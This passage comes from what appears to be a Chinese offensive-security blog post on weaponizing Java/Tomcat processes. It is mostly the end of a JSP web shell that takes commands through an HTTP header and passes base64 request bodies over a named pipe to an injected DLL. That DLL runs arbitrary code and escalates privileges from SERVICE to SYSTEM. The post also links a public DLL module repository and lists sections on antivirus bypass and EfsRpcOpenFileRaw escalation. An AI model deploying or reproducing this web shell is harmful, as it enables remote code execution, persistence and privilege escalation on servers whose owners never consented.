</span></span><span style=display:flex><span>            RandomAccessFile pipe <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RandomAccessFile(pipeName, <span style=color:#e6db74>&#34;rw&#34;</span>);
</span></span><span style=display:flex><span>            pipe.write(<span style=color:#ae81ff>0x03</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(pipe.readByte() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x01</span>){
</span></span><span style=display:flex><span>                out.println(<span style=color:#e6db74>&#34;OK&#34;</span>);
</span></span><span style=display:flex><span>            }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>                out.println(<span style=color:#e6db74>&#34;Failed&#34;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            pipe.close();
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (method.equals(<span style=color:#e6db74>&#34;code&#34;</span>)){
</span></span><span style=display:flex><span>            RandomAccessFile pipe <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RandomAccessFile(pipeName, <span style=color:#e6db74>&#34;rw&#34;</span>);
</span></span><span style=display:flex><span>            pipe.write(<span style=color:#ae81ff>0x01</span>);
</span></span><span style=display:flex><span>            pipe.write(<span style=color:#66d9ef>new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getInputStream()));
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(pipe.readByte() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x01</span>){
</span></span><span style=display:flex><span>                out.println(<span style=color:#e6db74>&#34;OK&#34;</span>);
</span></span><span style=display:flex><span>            }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>                out.println(<span style=color:#e6db74>&#34;Failed&#34;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            pipe.close();
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (method.equals(<span style=color:#e6db74>&#34;system&#34;</span>)){
</span></span><span style=display:flex><span>            RandomAccessFile pipe <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RandomAccessFile(pipeName, <span style=color:#e6db74>&#34;rw&#34;</span>);
</span></span><span style=display:flex><span>            pipe.write(<span style=color:#ae81ff>0x04</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(pipe.readByte() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x01</span>){
</span></span><span style=display:flex><span>                out.println(<span style=color:#e6db74>&#34;OK&#34;</span>);
</span></span><span style=display:flex><span>            }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>                out.println(<span style=color:#e6db74>&#34;Failed&#34;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            pipe.close();
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (method.equals(<span style=color:#e6db74>&#34;system-run&#34;</span>)){
</span></span><span style=display:flex><span>            RandomAccessFile pipe <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RandomAccessFile(pipeName, <span style=color:#e6db74>&#34;rw&#34;</span>);
</span></span><span style=display:flex><span>            pipe.write(<span style=color:#ae81ff>0x05</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(pipe.readByte() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x01</span>){
</span></span><span style=display:flex><span>                out.println(<span style=color:#e6db74>&#34;OK&#34;</span>);
</span></span><span style=display:flex><span>            }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>                out.println(<span style=color:#e6db74>&#34;Failed&#34;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            pipe.close();
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (method.equals(<span style=color:#e6db74>&#34;system-code&#34;</span>)){
</span></span><span style=display:flex><span>            RandomAccessFile pipe <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RandomAccessFile(pipeName, <span style=color:#e6db74>&#34;rw&#34;</span>);
</span></span><span style=display:flex><span>            pipe.write(<span style=color:#ae81ff>0x07</span>);
</span></span><span style=display:flex><span>            pipe.write(<span style=color:#66d9ef>new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getInputStream()));
</span></span><span style=display:flex><span>            pipe.close();
</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (method.equals(<span style=color:#e6db74>&#34;system-uncode&#34;</span>)){
</span></span><span style=display:flex><span>            RandomAccessFile pipe <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RandomAccessFile(pipeName, <span style=color:#e6db74>&#34;rw&#34;</span>);
</span></span><span style=display:flex><span>            pipe.write(<span style=color:#ae81ff>0x08</span>);
</span></span><span style=display:flex><span>            pipe.close();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>catch</span> (Exception e){
</span></span><span style=display:flex><span>        System.out.println(e.toString());
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span><span style=color:#f92672>%&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p><code>java.io.RandomAccessFile</code>可以读写命令管道，通过修改Header头<code>WWW-Authenticate</code>来控制不同的功能，每个功能都有一个16进制的编号，剩余的Body内容将会被放到其他内存区域，以供功能函数调用读取，如此以来解决了每个请求都可以执行不同功能的问题，只发送一次DLL就可以将DLL模块打入Tomcat/Java进程的内存中执行，并且利用管道读写的特性也能够实现数据的回显，这个已经在示例代码中体现出来了。</p><p>SERVICE提权到SYSTEM权限并执行任意代码的流程示例图如下：</p><p><img src=https://images.payloads.online/2022-08-11-22-08-44.png alt></p><p>公开的DLL模块代码：<a href=https://github.com/Rvn0xsy/j2osWin>https://github.com/Rvn0xsy/j2osWin</a></p><p>演示视频：暂无。</p></div><nav class="hide-on-mobile section-nav"><nav id=TableOfContents><ol><li><a href=#0x00-前言>0x00 前言</a></li><li><a href=#0x01-猜想的进程链>0x01 猜想的进程链</a></li><li><a href=#0x02-windows错误代码>0x02 Windows错误代码</a></li><li><a href=#0x03-java加载动态链接库常见的三种办法>0x03 Java加载动态链接库常见的三种办法</a></li><li><a href=#0x04-windows-动态链接库>0x04 Windows 动态链接库</a></li><li><a href=#0x05-实战绕过数字杀毒添加用户>0x05 实战绕过数字杀毒添加用户</a></li><li><a href=#0x06-将java进程进行权限提升>0x06 将Java进程进行权限提升</a><ol><li><a href=#0x061-efsrpcopenfileraw-提权>0x06.1 EfsRpcOpenFileRaw 提权</a></li></ol></li><li><a href=#0x07-武器化的思路与实现>0x07 武器化的思路与实现</a></li></ol></nav></nav></div><div class=post><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script><script>var enableTruncate=!0,filterDepth=!1;const MAX_DEPTH=9;window.addEventListener("DOMContentLoaded",()=>{const e=new IntersectionObserver(e=>{e.reverse().forEach(e=>{const n=e.target.getAttribute("id");if(e.intersectionRatio>0){var t=document.querySelectorAll(`nav li a[href="#${n}"]`);t!=null&&t.forEach(e=>{if(e!=null){var t=getDepth(e.parentElement);filterDepth&&t<=MAX_DEPTH&&(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))}else filterDepth||(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))})}})});document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]").forEach(t=>{e.observe(t)})});function isVisible(e){if(!(e instanceof Element))return!1;const n=getComputedStyle(e);if(n.display==="none")return!1;if(n.visibility!=="visible")return!1;if(n.opacity<.1)return!1;if(e.offsetWidth+e.offsetHeight+e.getBoundingClientRect().height+e.getBoundingClientRect().width===0)return!1;const t={x:e.getBoundingClientRect().left+e.offsetWidth/2,y:e.getBoundingClientRect().top+e.offsetHeight/2};if(t.x<0)return!1;if(t.x>(document.documentElement.clientWidth||window.innerWidth))return!1;if(t.y<0)return!1;if(t.y>(document.documentElement.clientHeight||window.innerHeight))return!1;let s=document.elementFromPoint(t.x,t.y);do if(s===e)return!0;while(s=s.parentNode)return!1}function clearActiveStatesInTableOfContents(){document.querySelectorAll("nav li").forEach(e=>{e.classList.remove("active")})}function getDepth(e){for(var t=0;e!==null&&e.tagName.toLowerCase()!=="ul";)t++,e=e.parentElement;return t}function navItems(){var e=document.querySelectorAll("nav nav li a");return Array.from(e).filter(e=>e.href!=null&&e.hash.startsWith("#"))}function lasItemInNavBarVisible(){var e=navItems().slice(-1)[0];return isVisible(e)}document.addEventListener("DOMContentLoaded",function(){if(!enableTruncate)return;var e=navItems();console.log(e),lasItemInNavBarVisible()||(filterDepth=!0,e.forEach(function(e){var t=getDepth(e.parentElement);t>MAX_DEPTH&&e.parentElement.classList.add("depth-nested")}))})</script></body></html>